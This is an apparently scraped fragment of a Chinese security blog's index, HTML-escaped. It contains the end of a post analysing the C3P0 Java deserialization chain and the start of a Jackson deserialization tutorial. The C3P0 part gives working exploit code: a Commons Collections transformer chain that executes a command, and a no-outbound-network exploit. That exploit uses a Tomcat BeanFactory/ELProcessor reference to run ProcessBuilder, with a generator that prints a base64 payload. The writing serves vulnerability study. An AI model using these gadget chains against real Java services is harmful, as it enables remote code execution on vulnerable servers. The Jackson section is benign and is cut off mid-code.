Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),\n                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),\n                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)\n        &#125;;\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();\n        /// 先不传入chainedTransformer，之后等hashmap的put方法执行完毕之后再存入，而这里存入ConstantTransformer，是因为后续hashcode的put方法触发链子的时候，最终调用transform方法不会有其他的代码执行影响流程\n        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,new ConstantTransformer(1));\n        //==========================================================================\n\n\n        //===========================初始化 TiedMapEntry以及hashmap\n        TiedMapEntry tiedMapeEntry=new TiedMapEntry(lazymap,&quot;aaa&quot;);\n\n        HashMap&lt;Object,Object&gt; map2= new HashMap&lt;&gt;();\n        map2.put(tiedMapeEntry,&quot;bbb&quot;);\n        lazymap.remove(&quot;aaa&quot;);\n\n\n        //========================================反射写入chainedTransfomer\n        Class c=LazyMap.class;\n        Field factoryField=c.getDeclaredField(&quot;factory&quot;);\n        factoryField.setAccessible(true);\n        factoryField.set(lazymap,chainedTransformer);\n\n        ByteArrayOutputStream bao = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(bao);\n        oos.writeObject(map2);\n        byte[] temp=bao.toByteArray();\n        BigInteger bigInt = new BigInteger(1, temp);\n        String hexString = bigInt.toString(16);\n        return hexString;\n    &#125;\n&#125;这里最后调试的时候我发现自己之前有一段思路是错的，其实调用链并不是这个,fastjson 会首先实例化一个空WrapperConnectionPoolDataSource对象，然后再去调它的 setuserOverridesString时触发后续漏洞，所以关于它的实例化其实并不会去触发漏洞\n但我相信上述流程也大概了解了最终的触发点，以及所需要的必要条件，现在只是回到正路\n1x04 漏洞流程解析接下来才是真正的反序列化过程，fastjson 在实例化完成之后会调用其 set 方法进行赋值我们跟进到这个过程，成功来到setUserOverridesAsString它首先会判断我们当前的 userOverridesAsString 是否与默认的 String 相同，默认是 null，我们肯定不是空，所以这里可以跟进，来到vcs.fireVetoableChange，但并不是直接就进入fireVetoableChange 的内容，它会跟进到wrapper 中的 setUpProperyListeners 中（原理在最开始的链子图中）\n首先获取参数名以及具体的值—我们传入的 UserOverString由于这个方法并不是单单只处理userOverridesAsString 这一个参数，所以他会先判断是那种情况，然后来到 String 的处理逻辑，发现就是我们最终的C3P0ImplUtils.parseUserOverridesAsString下面的跟进就和上面功能分析时一样了\n0x04 C3P0 不出网利用不仅不出网，而且还无 fastjon 和 jackson 依赖其实上述三个方法中，如果我们要再利用，就只存在 URLClassLoader 的可能了，JNDI 和 HEX 序列化字节码编码器呢都需要 fastjson 或者 jackson 的来触发假如说我们还是走老路，选定 URLClassLoader 继续打，那我们最终是通过 reference 类指定的远程地址去加载工厂类的，但是现在条件是不出网，那我们有没有可能通过本地的工厂类继续打呢？回想之前 JNDI 高版本绕过，我们也是因为高版本将远程 codebase 给禁止了，所以不能继续打远程工程恶意类而选择的其他路，这条路是否也能够用到我们本次 C3P0 的绕过呢？答案肯定是可以的，所以我们这次尝试 EL 表达式绕过的方法来打 C3P0 的不出网利用\n1x01 EL 表达式利用绕过组件分析就不分析了，都是之前师傅们学习过的东西，这里直接看如何利用的先把依赖打上（可能不需要这么多，但我当时为了不麻烦就相关全打上了）\nxml&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;\n  &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;\n  &lt;version&gt;8.5.71&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;\n  &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;\n  &lt;version&gt;8.5.0&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.el&lt;/groupId&gt;\n  &lt;artifactId&gt;com.springsource.org.apache.el&lt;/artifactId&gt;\n  &lt;version&gt;7.0.26&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper-el --&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;\n  &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;\n  &lt;version&gt;8.5.50&lt;/version&gt;\n&lt;/dependency&gt;\n\n\n&lt;!-- https://mvnrepository.com/artifact/javax.el/el-api --&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;javax.el&lt;/groupId&gt;\n  &lt;artifactId&gt;el-api&lt;/artifactId&gt;\n  &lt;version&gt;2.2&lt;/version&gt;\n&lt;/dependency&gt;然后就是直接上 POC 了，只需要把 reference 中的工厂指定为 beanFactory 即可\njavapackage HighbyPass;\n\nimport javax.naming.NamingException;\nimport javax.naming.Reference;\nimport javax.naming.Referenceable;\nimport javax.naming.StringRefAddr;\nimport javax.sql.ConnectionPoolDataSource;\nimport javax.sql.PooledConnection;\nimport java.io.PrintWriter;\nimport java.sql.SQLException;\nimport java.sql.SQLFeatureNotSupportedException;\nimport java.util.logging.Logger;\nimport org.apache.naming.ResourceRef;\npublic class CPDS implements ConnectionPoolDataSource , Referenceable &#123;\n\n    @Override\n    public Reference getReference() throws NamingException &#123;\n        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);\n        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));\n        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance()&quot; +\n                &quot;.getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]&quot; +\n                &quot;([&#39;calc&#39;]).start()\\&quot;)&quot;));\n        return ref;\n    &#125;\n    @Override\n    public PooledConnection getPooledConnection() throws SQLException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public PooledConnection getPooledConnection(String user, String password) throws SQLException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public PrintWriter getLogWriter() throws SQLException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public void setLogWriter(PrintWriter out) throws SQLException &#123;\n\n    &#125;\n\n    @Override\n    public void setLoginTimeout(int seconds) throws SQLException &#123;\n\n    &#125;\n\n    @Override\n    public int getLoginTimeout() throws SQLException &#123;\n        return 0;\n    &#125;\n\n    @Override\n    public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;\n        return null;\n    &#125;\n\n\n&#125;javapackage HighbyPass;\n\nimport com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport HighbyPass.CPDS;\npublic class test &#123;\n    public static void main(String[] args) throws Exception &#123;\n        PoolBackedDataSourceBase pbds=new PoolBackedDataSourceBase(false);\n        Class cls= pbds.getClass();\n        Field field=cls.getDeclaredField(&quot;connectionPoolDataSource&quot;);\n        field.setAccessible(true);\n        field.set(pbds,new CPDS());\n        serialize(pbds);\n        unserialize();\n    &#125;\n\n    public  static void serialize(PoolBackedDataSourceBase pbds) throws Exception&#123;\n        FileOutputStream fil=new FileOutputStream(new File(&quot;ser.bin&quot;));\n        ObjectOutputStream oos= new ObjectOutputStream(fil);\n        oos.writeObject(pbds);\n    &#125;\n\n\n    public static void unserialize()throws Exception &#123;\n        FileInputStream fis=new FileInputStream(new File(&quot;ser.bin&quot;));\n        ObjectInputStream objectInputStream=new ObjectInputStream(fis);\n        objectInputStream.readObject();\n    &#125;\n&#125;\n可利用 EXP:\njavapackage HighbyPass;\n\nimport com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\npublic class POCandEXP &#123;\n    public static void main(String[] args) throws Exception &#123;\n        PoolBackedDataSourceBase pbds=new PoolBackedDataSourceBase(false);\n        Class cls= pbds.getClass();\n        Field field=cls.getDeclaredField(&quot;connectionPoolDataSource&quot;);\n        field.setAccessible(true);\n        field.set(pbds,new CPDS());\n        serialize(pbds);\n    &#125;\n\n\n    //可利用生成payload\n        public  static String serialize(PoolBackedDataSourceBase pbds) throws Exception&#123;\n            ByteArrayOutputStream bao = new ByteArrayOutputStream();\n            ObjectOutputStream oos = new ObjectOutputStream(bao);\n            oos.writeObject(pbds);\n            byte[] temp=bao.toByteArray();\n            Base64.Encoder encoder=Base64.getEncoder();\n            String payload=encoder.encodeToString(temp);\n            System.out.println(payload);\n            return payload;\n    &#125;\n&#125;","slug":"C3P0链分析","date":"2024-03-22T07:00:00.000Z","categories_index":"锻刀的理论学习-C3P0","tags_index":"锻刀","author_index":"stoocea"},{"id":"9912b0ceefc40d219d2c4bb75f3cebf3","title":"Jackson反序列化初步学习","content":"https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/https://xz.aliyun.com/t/12966?time__1311&#x3D;mqmhqIx%2BODkDCDlxGofDyAID8UuyaqRG%2BD&amp;alichlgref&#x3D;https%3A%2F%2Fwww.google.com%2F#toc-6http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/\nJackson 基本使用jackson 其实使用起来还是很广泛的，之前学习 springMVC 的时候就感受到过，它的默认解析器就是 jackson。\n0x00 核心模块浅尝\njackson-core：核心包，提供最重要的基于流模式的解析功能相关的 API，包括 JsonParser 和 JsonGenerator\njackson-annotations：注解包，契合 spring 一系的开发模式，提供注解相关功能\njackson-databind:数据绑定包，提供基于”对象绑定”解析的相关 API（ObjectMapper）\t,以及基于”树模型”解析的相关 API(JsonNode)，什么意思呢？我个人理解就是对于特定格式的 json 数据处理，需要有特定的处理方式，这个包中的内容就是关于这部分的\n\n0x01 环境准备首先打上依赖\njava&lt;dependencies&gt;  \n  &lt;dependency&gt;  \n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;  \n    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;  \n    &lt;version&gt;2.7.9&lt;/version&gt;  \n  &lt;/dependency&gt;  \n  &lt;dependency&gt;  \n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;  \n    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;  \n    &lt;version&gt;2.7.9&lt;/version&gt;  \n  &lt;/dependency&gt;  \n  &lt;dependency&gt;  \n    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;  \n    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;  \n    &lt;version&gt;2.7.9&lt;/version&gt;  \n  &lt;/dependency&gt;  \n&lt;/dependencies&gt;\n0x02 组件分析1x01 ObjectMapper他是 jackson 中最常用的 API，之所以被叫做 ObjectMapper，就是因为它将 json 映射到 java 对象（反序列化），或者将 java 对象映射到 json（序列化）objectMapper 作用范围很多：能够从字符串，流或者文件中解析 JSON\n2x01 将 json 转化为对象直接看测试类\njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class test &#123;\n\n    public static void main(String[] args) &#123;\n        String json=&quot;&#123;\\&quot;name\\&quot;:\\&quot;John\\&quot;, \\&quot;age\\&quot;:30&#125;&quot;;\n        ObjectMapper objectMapper=new ObjectMapper();\n        try&#123;\n            Person person=objectMapper.readValue(json,Person.class);\n\n            System.out.println(person);\n\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;person 类就不写了，按照例写字段属性值就行输出结果如下\n2x02 将对象转化为 jsonjavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class test &#123;\n\n    public static void main(String[] args) &#123;\n        //String json=&quot;&#123;\\&quot;name\\&quot;:\\&quot;John\\&quot;, \\&quot;age\\&quot;:30&#125;&quot;;\n        ObjectMapper objectMapper=new ObjectMapper();\n        Person person=new Person(&quot;stoocea&quot;,20);\n\n        try&#123;\n            //Person person=objectMapper.readValue(json,Person.class);\n            String json=objectMapper.writeValueAsString(person);\n            System.out.println(json);\n\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;输出结果如下：其实还有很多方法\n\nwriteValue()\nwriteValueAsString()\nwriteValueAsBytes()\n\n这里就不一一列举了\n1x02 JsonParserjackson JsonParser 是一个底层一些的 JSON 解析器，也就是说 jsonparser 用起来其实要比 ObjectMapper 还要更快，只不过用的前提要比 ObjectMapper 麻烦\njavaimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonParser;\nimport com.fasterxml.jackson.core.JsonToken;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class test2 &#123;\n    public static void main(String[] args) &#123;\n        String json=&quot;&#123;\\&quot;name\\&quot;:\\&quot;John\\&quot;, \\&quot;age\\&quot;:30&#125;&quot;;\n        JsonFactory jsonFactory = new JsonFactory();\n        try&#123;\n            JsonParser jsonParser=jsonFactory.createParser(json);\n            while(!jsonParser.isClosed())&#123;\n                JsonToken jsonToken=jsonParser.nextToken();\n                System.out.println(jsonToken);\n            &#125;\n\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;JsonParser 的工作方式是将 json 分解为一系列的令牌，可以一个一个迭代令牌，这些令牌其实是一个一个的字段属性值我们可以通过 equals 方法来判断当前生成的这一系列的令牌的键值对名是否为想要反序列化类的属性值名，然后通过getValueAsString 等方法获取出来\njavaimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonParser;\nimport com.fasterxml.jackson.core.JsonToken;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class test2 &#123;\n    public static void main(String[] args)&#123;\n        String json = &quot;&#123;\\&quot;name\\&quot;:\\&quot;fakes0u1\\&quot;,\\&quot;age\\&quot;:123&#125;&quot;;\n        JsonFactory jsonFactory = new JsonFactory();\n        try&#123;\n            JsonParser parser = jsonFactory.createParser(json);\n            while(!parser.isClosed())&#123;\n                JsonToken jsonToken = parser.nextToken();\n                if (JsonToken.FIELD_NAME.equals(jsonToken))&#123;\n                    String fieldName = parser.getCurrentName();\n                    System.out.println(fieldName);\n\n                    jsonToken=parser.nextToken();\n\n                    if (&quot;name&quot;.equals(fieldName))&#123;\n                        System.out.println(parser.getValueAsString());\n\n                    &#125;\n                    else if (&quot;age&quot;.equals(fieldName))&#123;\n                        System.out.println(parser.getValueAsInt());\n                    &#125;\n                &#125;\n\n            &#125;\n        &#125;\n        catch (Exception e )&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n首先判断当前取到的 token 是不是 field，也就是字段属性，如果是的话那我们就可以通过 parser 去获取当前的字段属性了\n1x03 JsonGeneratorJsonGenerator 只作用于 java 对象到 json 字符串的转化\njavaimport com.fasterxml.jackson.core.JsonEncoding;\nimport com.fasterxml.jackson.core.JsonFactory;\nimport com.fasterxml.jackson.core.JsonGenerator;\nimport jdk.nashorn.internal.runtime.regexp.JoniRegExp;\n\nimport java.io.File;\n\npublic class test3 &#123;\n    public static void main(String[] args) &#123;\n        JsonFactory jsonFactory=new JsonFactory();\n        Person person=new Person();\n        try&#123;\n            JsonGenerator jsonGenerator=jsonFactory.createGenerator(new File(&quot;output.json&quot;), JsonEncoding.UTF8);\n            jsonGenerator.writeStartObject();\n            jsonGenerator.writeStringField(&quot;name&quot;,&quot;stoocea&quot;);\n            jsonGenerator.writeNumberField(&quot;age&quot;,20);\n            jsonGenerator.writeEndObject();\n\n            jsonGenerator.close();\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n使用起来还是比较麻烦的\n如果平常有序列化和反序列化的需求，一般都是用 ObjectMapper 了，他里面的writeValueAsString()以及readValue()方法都挺方便的，我们待会要进的流程也是从两者进入\n1x04 多态问题解决– JacksonPolymorphicDeserializationjava 中多态的定义就不多谈了，就是同一个接口由于有其不同的实例而执行不同的操作，而在 jackson 中也需要解决这个问题在 jackson 中， 一般是使用 JacksonPolymorphicDeserialization 来解决，在反序列化某个对象的过程中，如果类成员不是具体的类型，比如是 Object 类型的接口或者抽象类，那么我们可以在 JSON 字符串中指定出来具体的类型，jackson 将根据我们指定的具体类型来生成指定的类型实例简单来说就是将具体的子类信息绑定到 json 序列化数据中就行，只不过前提是我们这个类成员类型不能是具体的，不然就不叫多态了具体实现呢，就是 DefaultTyping 和@JsonTypeInfo注解来实现先看 DefaultTyping\n2x01 DefaultTypingDefaultTyping 本身就存在于 ObjectMapper 的子类定义中，然后它里面包含了 4 个值这 4 个值也就代表着我们能够通过 jackson 去解决多态问题的条件\n3x01 JAVA_LANG_OBJECT 当被序列化或反序列化的类里的属性被声明为一个Object类型时 会对该Object类型的属性进行序列化和反序列化 并明确规定类名  \njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class JacksonPD &#123;\n    public static void main(String[] args) throws Exception &#123;\n            person2 person2=new person2();\n            person2.setAge(20);\n            person2.setName(&quot;stoocea&quot;);\n            person2.setobject(new hacker());\n\n            ObjectMapper objectMapper=new ObjectMapper();\n            objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);\n\n            String json=objectMapper.writeValueAsString(person2);\n            System.out.println(json);\n\n    &#125;\n\n\n&#125;\n这是加了JAVA_LANG_OBJECT 的情况下如果不加结果如下：发现我们指定的 hacker 类并没有被序列化，只是序列化了一个 object 类，其自读属性和 hacker 一样\n3x02 OBJECT_AND_NON_CONCRETE 当类中有Interface AbstractClass类时 对其进行序列化和反序列化 这也是enableDefaultTyping() 的默认选项  \njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class JacksonPD &#123;\n    public static void main(String[] args) throws Exception &#123;\n        person2 person2=new person2();\n        person2.setAge(20);\n        person2.setName(&quot;stoocea&quot;);\n        person2.object=new mysex();\n        ObjectMapper objectMapper=new ObjectMapper();\n        //objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);\n        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);\n        String json=objectMapper.writeValueAsString(person2);\n        System.out.println(json);\n        person2 person2_1=objectMapper.readValue(json,person2.class);\n        System.out.println(person2_1);\n\n    &#125;\n&#125;\n结果如下，发现接口也被序列化了\n3x03 NON_CONCRETE_AND_ARRAYS继续增加作用范围，这次可以序列化 array 数组类型了\njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class JacksonPD &#123;\n    public static void main(String[] args) throws Exception &#123;\n        person2 person2=new person2();\n        person2.setAge(20);\n        person2.setName(&quot;stoocea&quot;);\n        hacker[] hackers=new hacker[2];\n        hackers[0]=new hacker(&quot;tea&quot;);\n        hackers[1]=new hacker(&quot;coffee&quot;);\n        person2.object=hackers;\n        ObjectMapper objectMapper=new ObjectMapper();\n        //objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);\n        //objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);\n        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);\n        String json=objectMapper.writeValueAsString(person2);\n        System.out.println(json);\n        person2 person2_1=objectMapper.readValue(json,person2.class);\n        System.out.println(person2_1);\n\n    &#125;\n&#125;\n结果如下这里会稍显不同，我们看到在 hacker 数组类的序列化数据前面有一个 [L 标识，这其实是标识 jackson 在序列化和反序列化的过程中对 array 类型也执行了相同的操作如果不加，也是相同的操作，它会往 object 属性字段塞一个数组进去，并不会真得去反序列化 Hackers 这个具体类型\n3x04 NON_FINAL这个更是重量级，除了上述三个默认值的范围，它还继续扩大可序列化的范围，直至没有 final 标识的属性字段都能被反序列化这里我们对 person2 类稍作修改然后测试类继续\njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class JacksonPD &#123;\n    public static void main(String[] args) throws Exception &#123;\n        person2 person2=new person2();\n        person2.setAge(20);\n        person2.setName(&quot;stoocea&quot;);\n        hacker[] hackers=new hacker[2];\n        hackers[0]=new hacker(&quot;tea&quot;);\n        hackers[1]=new hacker(&quot;coffee&quot;);\n        person2.object=hackers;\n        person2.hacker=new hacker(&quot;npt&quot;);\n        ObjectMapper objectMapper=new ObjectMapper();\n        //objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);\n        //objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);\n        //objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);\n        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);\n        String json=objectMapper.writeValueAsString(person2);\n        System.out.println(json);\n        person2 person2_1=objectMapper.readValue(json,person2.class);\n        System.out.println(person2_1);\n\n    &#125;\n&#125;\n结果如下\n综述上面 4 个默认属性对于序列化的范围是逐渐递增的\n\n\n\nDefaultTyping类型\n描述说明\n\n\n\nJAVA_LANG_OBJECT\n属性的类型为Object\n\n\nOBJECT_AND_NON_CONCRETE\n属性的类型为Object、Interface、AbstractClass\n\n\nNON_CONCRETE_AND_ARRAYS\n属性的类型为Object、Interface、AbstractClass、Array\n\n\nNON_FINAL\n所有除了声明为final之外的属性\n\n\n2x02 @JsonTypeInfo注解一共支持下面 5 种类型的取值\njava@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)\n@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)\n@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)\n@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)\n@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)下面逐个看使用案例\n3x01 JsonTypeInfo.Id.NONE先给 person2 类打上注解，然后我们的测试类就不需要通过 objectMapper 亲自去设置属性了\njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class test &#123;\n\n    public static void main(String[] args) &#123;\n        person2 person2=new person2();\n        person2.setName(&quot;stoocea&quot;);\n        person2.setAge(20);\n        person2.hacker=new hacker(&quot;duuuu&quot;);\n        person2.object=new mysex();\n        ObjectMapper objectMapper=new ObjectMapper();\n        //Person person=new Person(&quot;stoocea&quot;,20);\n\n        try&#123;\n            String json=objectMapper.writeValueAsString(person2);\n            //String json=objectMapper.writeValueAsString(person);\n            System.out.println(json);\n            person2 person2_1=objectMapper.readValue(json,person2.class);\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n结果如下发现好像和加没加注释没有区别，它并没有去序列化具体的类型，这其实也很容易想，它本身注解里面就是 None，那肯定是啥都不会去做的\n3x02 JsonTypeInfo.Id.CLASS修改 person2 中注解内容为JsonTypeInfo.Id.CLASS，然后再经过一遍测试类发现这次多了很多东西首先就是最明显的加了一个@class标识符，然后里面也确实例化了具体类，但是我们还是看到 mysex 的 sex 接口没有被序列化出来，但是该序列化出的类还是\n3x03 JsonTypeInfo.Id.NAME还是修改 person2 中的注解,然后运行测试类，先看序列化的结果，它包含了@type具体标识了类型，但是没有获取全类名，这也是为什么后续有个报错的原因\n3x04 JsonTypeInfo.Id.CUSTOM这个其实是用来给用户自定义的，我们必须自己手动写一个解析器才行，没办法直接使用\n3x05  JsonTypeInfo.Id.MINIMAL_CLASS修改注解值，然后测试 发现之前的其实单单只是缩短了 @class标识，效果还是 CLASS 差不多的\n综上所述，jackson 注解中能够使得我们进行反序列化的值有如下两个：\n\nJsonTypeInfo.Id.CLASS  \nJsonTypeInfo.Id.MINIMAL_CLASS\n\n1x05 反序列化中类属性方法调用这里做个记录是为了给后续的反序列化流程调用做铺垫\n2x01 enableDefaultTyping调试代码如下\njavaimport com.fasterxml.jackson.annotation.JsonTypeInfo;\n\npublic class Person &#123;\n    public String name;\n    public  int age;\n    \n    public Object mysex;\n\n\n    public Person(String name, int age, Object mysex) &#123;\n        this.name = name;\n        this.age = age;\n        this.mysex = mysex;\n    &#125;\n\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n\n    public int getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(int age) &#123;\n        this.age = age;\n    &#125;\n\n    public Object getMysex() &#123;\n        return mysex;\n    &#125;\n\n    public void setMysex(Object mysex) &#123;\n        this.mysex = mysex;\n    &#125;\n\n    public Person() &#123;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Person&#123;&quot; +\n                &quot;name=&#39;&quot; + name + &#39;\\&#39;&#39; +\n                &quot;, age=&quot; + age +\n                &quot;, mysex=&quot; + mysex +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\njavaimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class test &#123;\n\n    public static void main(String[] args) &#123;\n            Person person=new Person();\n            person.setMysex(new mysex());\n            ObjectMapper objectMapper=new ObjectMapper();\n            objectMapper.enableDefaultTyping();\n\n        try&#123;\n//            String json=objectMapper.writeValueAsString(person);\n//            System.out.println(json);\n            Person person1=objectMapper.readValue(&quot;&#123;\\&quot;name\\&quot;:null,\\&quot;age\\&quot;:0,\\&quot;mysex\\&quot;:[\\&quot;mysex\\&quot;,&#123;\\&quot;sex\\&quot;:1&#125;]&#125;&quot;,Person.class);\n\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n结果如下第一次无参构造是因为我在给 person 中的 mysex 字段赋值时实例化操作了 mysex那么可想而知的，后面 readValue 的操作就触发 mysex 的无参构造方法，先实例化了一个 mysex 的对象，然后调用 set 方法再去赋值这是采用 objectmapper 的enableDefaultTyping 设置下做的测试，接下来尝试注解形式\n2x02 JsonTypeInfo.Id.CLASS先注释掉测试代码中的objectMapper.enableDefaultTyping();操作，然后再给 person 类的指定字段属性值加上注解\njavaimport com.fasterxml.jackson.annotation.JsonTypeInfo;\n\npublic class Person &#123;\n    public String name;\n    public  int age;\n\n\n    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)\n    public Object mysex;\n\n\n    public Person(String name, int age, Object mysex) &#123;\n        this.name = name;\n        this.age = age;\n        this.mysex = mysex;\n    &#125;\n\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        this.name = name;\n    &#125;\n\n    public int getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(int age) &#123;\n        this.age = age;\n    &#125;\n\n    public Object getMysex() &#123;\n        return mysex;\n    &#125;\n\n    public void setMysex(Object mysex) &#123;\n        this.mysex = mysex;\n    &#125;\n\n    public Person() &#123;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Person&#123;&quot; +\n                &quot;name=&#39;&quot; + name + &#39;\\&#39;&#39; +\n                &quot;, age=&quot; + age +\n                &quot;, mysex=&quot; + mysex +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\n我们发现结果是一样的也就是说在 JacksonPolymorphicDeserialization 的前提下，反序列化操作都是会调用里面类\n如果这个时候我们再在 person 类中 set 方法和无参构造方法都加上 sout 标识\njavaimport com.fasterxml.jackson.annotation.JsonTypeInfo;\n\npublic class Person &#123;\n    public String name;\n    public  int age;\n\n\n    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)\n    public Object mysex;\n\n\n    public Person(String name, int age, Object mysex) &#123;\n        this.name = name;\n        this.age = age;\n        this.mysex = mysex;\n    &#125;\n\n\n    public String getName() &#123;\n        return name;\n    &#125;\n\n    public void setName(String name) &#123;\n        System.out.println(&quot;调用了person的setname&quot;);\n        this.name = name;\n    &#125;\n\n    public int getAge() &#123;\n        return age;\n    &#125;\n\n    public void setAge(int age) &#123;\n        System.out.println(&quot;调用了person的setAge&quot;);\n        this.age = age;\n    &#125;\n\n    public Object getMysex() &#123;\n        return mysex;\n    &#125;\n\n    public void setMysex(Object mysex) &#123;\n        System.out.println(&quot;调用了person的setMysex&quot;);\n        this.mysex = mysex;\n    &#125;\n\n    public Person() &#123;\n        System.out.println(&quot;调用person的无参构造方法&quot;);\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return &quot;Person&#123;&quot; +\n                &quot;name=&#39;&quot; + name + &#39;\\&#39;&#39; +\n                &quot;, age=&quot; + age +\n                &quot;, mysex=&quot; + mysex +\n                &#39;&#125;&#39;;\n    &#125;\n&#125;\n测试类不变，发现其实只要是 jackson 对于反序列化的操作都会有这种特性：调用无参构造方法生成实例化对象，调用 set 方法赋值\n0x03 工作流程分析1x00 环境搭建下面是我本次工作流程调试的具体准备\njavaimport com.fasterxml.jackson.annotation.JsonTypeInfo;\n\npublic class Person &#123;\n    public String name;\n    public  int age;\n\n\n    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)\n    public Object mysex;\n\n\n    public Person(String name, int age, Object mysex) &#123;\n        this.name = name;\n        